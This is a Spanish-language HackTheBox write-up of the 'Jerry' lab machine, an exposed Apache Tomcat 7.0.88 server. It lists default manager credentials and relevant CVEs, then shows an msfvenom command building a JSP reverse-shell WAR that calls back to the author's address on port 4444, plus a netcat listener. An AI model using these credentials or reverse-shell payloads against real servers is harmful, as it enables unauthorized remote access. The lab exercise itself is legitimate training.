---
title: "Jerry HTB"
machine: "Jerry"
platform: "HackTheBox"
os: "Windows"
difficulty: "Easy"
tags: ["CVE", "RCE"]
retired: true
summary: "bien el escaneo inicial me parecio curioso solo un puerto disponible y en el escaneo de deteccion de versiones y script predeterminados aparece como filtrado"
draft: false
---
# Enumeracion

bien el escaneo inicial me parecio curioso solo un puerto disponible y en el escaneo de deteccion de versiones y script predeterminados aparece como filtrado

![image.png](/img/jerry/1.png)

vale si que estaba abiertopero en el segundo escaneo usa la ip incorrecta 

![image.png](/img/jerry/2.png)

investigando la salida obtenemos esto 

### Análisis de Escaneo: Apache Tomcat 7.0.88

La salida confirma que el objetivo está corriendo un servidor **Apache Tomcat versión 7.0.88**. Esta versión es antigua y tiene vectores de ataque muy conocidos en entornos de HTB.

---

### Puntos Clave del Análisis

- **Servicio:** Apache Tomcat (Coyote JSP engine 1.1). Es un contenedor de servlets Java.
- **Versión:** **7.0.88**. Es una versión vulnerable a múltiples exploits si la configuración no es la adecuada.
- **Estado:** `open`. Tienes acceso directo al panel o a las aplicaciones que sirve.

---

### Vectores de Ataque Inmediatos

1. **Gestor de Aplicaciones (`/manager/html`):**
Tomcat permite desplegar archivos `.war` (que pueden contener una reverse shell). Intenta acceder a esta ruta. Si pide credenciales, las más comunes en laboratorios son:
    - `tomcat:s3cret`
    - `tomcat:tomcat`
    - `admin:admin`
    - `admin:password`
2. **Explotación por RCE (CVE-2017-12615):**
Esta versión (7.0.x) es vulnerable a la subida de archivos arbitrarios mediante el método **HTTP PUT** si el parámetro `readonly` está configurado como `false` en el archivo `web.xml`. Esto permite subir un archivo `.jsp` malicioso para ejecutar comandos.
3. **Vulnerabilidad Ghostcat (CVE-2020-1938):**
Aunque este CVE afecta principalmente al puerto AJP (8009), vale la pena verificar si el puerto 8080 expone alguna fuga de información o si el puerto 8009 está abierto pero no lo viste en el escaneo `F`.

busco exploit comunes para esa version y tenemos 2

```jsx
searchsploit Tomcat 7.0.88
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                          | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                          | jsp/webapps/42966.py
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

     ~/HTB/Jerry/content  ✔  
```

entro a impeccionar la pagina 

![image.png](/img/jerry/3.png)

![image.png](/img/jerry/4.png)

me pide usuario y contrase;a toca investigar como conseguirlos

investigando hay varias formas de conseguirlo aprovechando la configuracion por defecto de tomcat la primera que intentare sera metasploit 

con el modulo auxiliar de metasploit consegui las credenciales y estoy dentro 

![image.png](/img/jerry/5.png)

no seguire usando metasploit ya que esta fallando investigue y es algo general que parchearan en la proxima actualizacion asi que creo el payload con msfvenom y me pongo a escuchar por el puerto 4444

```jsx
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.254 LPORT=4444 -f war -o pwn.war
Payload size: 1103 bytes
Final size of war file: 1103 bytes
Saved as: pwn.war
❯ nc -lvnp 4444
listening on [any] 4444 ...
```

![image.png](/img/jerry/6.png)

como ven el archivo pwn.war se subio correctamente ahora lo abro y veo si se conecto 

![image.png](/img/jerry/7.png)

![image.png](/img/jerry/8.png)

**con esto mi sexta maquina ha sido hackeada** !!! esta me parecio demasiado facil incluso explotandola de forma manual sin metasploit creo que es por que me ense;aron como hacerlo en el modulo que acabo de terminar del cpts htb academy shells and payloads y comparandola con kobold o support o incluso twomillion que me parecieron mucho mas dificiles  .
